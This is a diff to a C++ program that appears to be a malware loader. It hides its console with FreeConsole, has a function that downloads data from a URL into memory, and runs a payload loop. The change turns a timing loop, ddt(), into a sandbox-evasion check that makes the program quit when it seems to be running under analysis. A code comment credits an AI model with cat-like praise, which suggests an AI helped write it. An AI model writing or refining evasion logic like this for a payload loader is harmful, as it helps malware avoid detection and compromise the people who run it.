@@ -18,8 +18,7 @@ using namespace std::chrono;
 
 // claude 4.6 opus 厉害喵, 喵喵喵喵喵喵 !!!!!!!!!!!!
 
-void ddt() {
-    while (true) {
+int ddt() {
         int counter = 1;
         auto start_time = high_resolution_clock::now();
         
@@ -30,12 +29,9 @@ void ddt() {
             counter++;
         }
         
-        if (counter > 90000000) break;
-        
-        double* pvalue = new double;
-        *pvalue = 29494.99;
-        delete pvalue;
-    }
+        if (counter < 90000000) return 1;
+
+        return 0;
 }
 
 vector<unsigned char> download_to_memory(const char* url) {
@@ -281,7 +277,7 @@ int main() {
 
     FreeConsole();
 
-    ddt();
+    if (ddt() == 1) return 1;
 
     do {
         result = run();
